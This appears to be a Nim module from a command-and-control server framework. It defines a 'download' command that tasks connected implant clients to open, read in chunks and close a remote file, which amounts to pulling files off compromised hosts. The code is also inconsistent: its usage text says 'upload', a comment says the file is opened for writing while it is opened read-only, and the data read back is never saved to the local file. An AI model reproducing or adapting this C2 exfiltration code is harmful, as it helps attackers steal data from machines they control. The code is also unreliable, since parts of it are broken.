import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    # Open file for writing
    var openFile = await client.sendClientTask("fsopenfile", tlvFromStringSeq(@[ "r", args[0] ]).buf)
    if openFile.isNil():
      errorLog "Server error opening file"
      return  
    await openFile.awaitResponse()
    let openFileTlv = initParser()
    openFileTlv.setBuffer(cast[seq[byte]](openFile.output.data))

    let fileId = openFileTlv.extractInt32()

    if fileId == -1:
      errorLog "Client error couldn't open file"
      return

    var fileSize = cast[int](openFileTlv.extractInt32())
    infoLog "reading " & $fileSize & " bytes"

    while fileSize != 0:
      var readFileMsg = initBuilder()
      readFileMsg.addInt32(0) # placeholder for argc
      readFileMsg.addInt32(fileId)
      readFileMsg.addInt32(1024)
      var readFile = await client.sendClientTask("fsreadfile", readFileMsg.buf)
      if readFile.isNil():
        errorLog "Server error reading file"
        return  
      await readFile.awaitResponse()
      let readFileTlv = initParser()
      readFileTlv.setBuffer(cast[seq[byte]](readFile.output.data))
      let readStatus = readFileTlv.extractInt32()
      infoLog $readStatus
      if readStatus == -1:
        errorLog "client error reading file"
        break
      let fileBuf = readFileTlv.extractString()
      infoLog "read " & $fileBuf.len & " bytes"
      fileSize -= fileBuf.len

    # Close file
    var closeFileMsg = initBuilder()
    closeFileMsg.addInt32(0) # placeholder for argc
    closeFileMsg.addInt32(fileId)
    var closeFile = await client.sendClientTask("fsclosefile", closeFileMsg.buf)
    if closeFile.isNil():
      errorLog "Server error closing file"
      return
    
let cmd*: Command = Command(
  execProc: execProc,
  name: "download",
  argsLength: 2,
  usage: @["upload [remote file] [local file]"],
  cliMode: @[ClientInteractMode],
  description: "Download a remote file to a local file",
  category: CCClientInteraction,
  requiresConnectedClient: true
)